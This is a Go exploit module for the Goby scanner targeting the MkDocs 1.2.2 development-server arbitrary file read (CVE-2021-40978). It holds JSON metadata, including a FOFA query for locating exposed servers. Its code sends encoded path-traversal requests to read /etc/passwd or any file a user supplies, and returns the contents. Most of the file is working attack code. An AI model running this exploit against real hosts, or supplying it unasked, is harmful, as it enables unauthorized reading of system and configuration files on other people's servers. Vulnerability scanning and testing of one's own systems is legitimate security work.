package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "MkDocs Arbitrary File Read (CVE-2021-40978)",
    "Description": "<p>MkDocs is a fast, simple and downright gorgeous static site generator that's geared towards building project documentation.</p><p>The built-in development server of mkdocs version 1.2.2 has arbitrary file reading vulnerabilities, and attackers can obtain sensitive information such as configuration.</p>",
    "Impact": "MkDocs Arbitrary File Read (CVE-2021-40978)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.mkdocs.org\">https://www.mkdocs.org</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "MkDocs",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "MkDocs 项目文档系统 1.2.2 版本任意文件读取漏洞（CVE-2021-40978）",
            "Description": "<p>MkDocs 是一个快速、简单和彻头彻尾的华丽静态站点生成器，用于构建项目文档。</p><p>mkdocs站点生成系统 1.2.2 版本内置的开发服务器存在任意文件读取漏洞，攻击者可获取配置等敏感信息。</p>",
            "Impact": "<p><MkDocs站点生成系统 1.2.2 版本内置的开发服务器存在任意文件读取漏洞，攻击者可获取配置等敏感信息。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.mkdocs.org\">https://www.mkdocs.org</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "MkDocs",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "MkDocs Arbitrary File Read (CVE-2021-40978)",
            "Description": "<p>MkDocs is a fast, simple and downright gorgeous static site generator that's geared towards building project documentation.</p><p>The built-in development server of mkdocs version 1.2.2 has arbitrary file reading vulnerabilities, and attackers can obtain sensitive information such as configuration.</p>",
            "Impact": "MkDocs Arbitrary File Read (CVE-2021-40978)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.mkdocs.org\">https://www.mkdocs.org</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "MkDocs",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "banner=\"WSGIServer\"",
    "GobyQuery": "banner=\"WSGIServer\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.mkdocs.org/",
    "DisclosureDate": "2021-09-25",
    "References": [
        "https://github.com/nisdn/CVE-2021-40978"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [
        "CVE-2021-40978"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "MkDocs"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10235"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := `/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && regexp.MustCompile("root:(.*?):0:0:").MatchString(resp.RawBody)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filepath"].(string)
			uri := "/" + cmd
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
